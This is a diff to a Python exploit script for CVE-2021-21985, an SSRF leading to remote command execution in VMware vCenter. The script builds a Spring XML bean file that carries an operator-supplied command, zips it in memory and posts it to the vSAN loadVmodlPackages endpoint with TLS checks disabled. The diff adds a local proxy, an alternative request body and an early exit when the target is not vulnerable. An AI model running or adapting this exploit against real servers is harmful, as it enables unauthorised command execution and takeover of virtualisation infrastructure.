@@ -16,6 +16,11 @@ import urllib3
 urllib3.disable_warnings()
 req = requests.session()
 
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "https://127.0.0.1:8080",
+}
+
 spel_xml = """<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="
@@ -104,6 +109,7 @@ def do_attack(target, payload):
     try:
         url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
         post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))], True]}
+        # post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))]]}
         result = req.post(url=url, headers=headers, data=json.dumps(post_data), verify=False)
         return result
     except requests.exceptions.RequestException as e:
@@ -126,6 +132,7 @@ def main(argv):
     result = isVuln(target)
     if result != True:
         print("[-] Maybe not SSRF Vuln [CVE-2021-21985]")
+        exit(0)
     imz = InMemoryZip()
     imz.append("offline_bundle.xml", (spel_xml % cmd))
     payload = imz.getb64zip()
